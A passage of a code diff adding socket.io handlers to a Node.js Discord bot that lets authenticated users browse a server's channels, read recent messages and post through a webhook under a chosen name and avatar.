+      guild: null,
+      channel: null,
+      lastChannel: null
+    }
+  };
+
+  socket.on("auth", async ({token}) => {
+    if (socket.data.user) return;
+    const user = await verifyToken(token);
+    if (!user) {
+      socket.disconnect();
+      return;
+    }
+    if (!user.flags.some(flag => flag.id === 1)) {
+      socket.disconnect();
+      return;
+    }
+
+    let checkSocket;
+    for (let s of io.sockets.sockets) {
+      if (s[1]?.data?.user?.login === user.login) {
+        checkSocket = s;
+      }
+    }
+    if (checkSocket) {
+      checkSocket[1].disconnect();
+    }
+    socket.data.user = user;
+  })
+  socket.on("load_webhook_data", async ({name, image, guild}) => {
+    if (!guild) return;
+    let guildObj;
+    try{
+      guildObj = await client.guilds.fetch(guild)
+    }catch (e){
+      return;
+    }
+    name = name || "Webhook";
+    image = image || "https://indiaatoz.in/wp-content/uploads/2021/09/6138f89602459-384x384.png";
+
+    socket.data.webSender.webHook = {name, image};
+    socket.data.webSender.guild = guild;
+
+    let channels = Array.from(guildObj.channels.cache).filter(channel => {
+      return channel[1].type === "GUILD_TEXT" || channel[1].type === "GUILD_CATEGORY"
+    }).map(channel => {
+      return {
+        name: channel[1].name,
+        id: channel[1].id,
+        parentId: channel[1].parentId,
+        position: channel[1].position,
+        type: channel[1].type
+      }
+    });
+    socket.emit("channels_data", channels);
+  })
+  socket.on("set_current_channel", async (id) => {
+    socket.data.webSender.lastChannel = socket.data.webSender.channel;
+    id = id || null;
+    socket.data.webSender.channel = id;
+    let guildObj;
+    try{
+      guildObj = await client.guilds.fetch(socket.data.webSender.guild)
+    }catch (e){
+      return;
+    }
+    if (!guildObj) return;
+    let channel = await guildObj.channels.fetch(id);
+    if (!channel) return;
+    let messages = (await channel.messages.fetch({ limit: 50 })).map(mes => {
+      return {
+        authorName: mes.author.username,
+        authorImageURL: mes.author.displayAvatarURL(),
+        content: mes.content
+      }
+    }).reverse();
+    socket.emit("messages_fetch", messages);
+  })
+
+  socket.on("sendMessage", async (message) => {;
+    let guildObj;
+    try{
+      guildObj = await client.guilds.fetch(socket.data.webSender.guild)
+    }catch (e){
+      return;
+    }
+    if (!guildObj) return;
+    let channel = await guildObj.channels.fetch(socket.data.webSender.channel);
+    if (!channel) return;
+    try{
+      const webhooks = await channel.fetchWebhooks();
+      let webhook = webhooks.find(wh => wh.name === "WebSenderService");
+      if (!webhook){
+        webhook = await channel.createWebhook("WebSenderService", {
+          avatar: "",
+        });
+      }
+      if (!message?.content) return;
+      await webhook.send({
+        content: message.content,
+        username: socket.data.webSender.webHook.name,
+        avatarURL: socket.data.webSender.webHook.image,
+        embeds: message?.embeds || []})
+    }catch (e) {
+      return;
+    }
+  })
+
+  client.on("messageCreate", async (message) => {
+    if (message.guild.id === socket.data.webSender.guild && message.channel.id === socket.data.webSender.channel){
+      let mes = {
+          authorName: message.author.username,
+          authorImageURL: message.author.displayAvatarURL(),
+          content: message.content
+        }
+      socket.emit("new_message", mes);
+    }
+  })
+
+});
+
+server.listen(process.env.PORT || 3001, () => {
   console.log(`Server running on port ${process.env.PORT || 3001}`)
 })
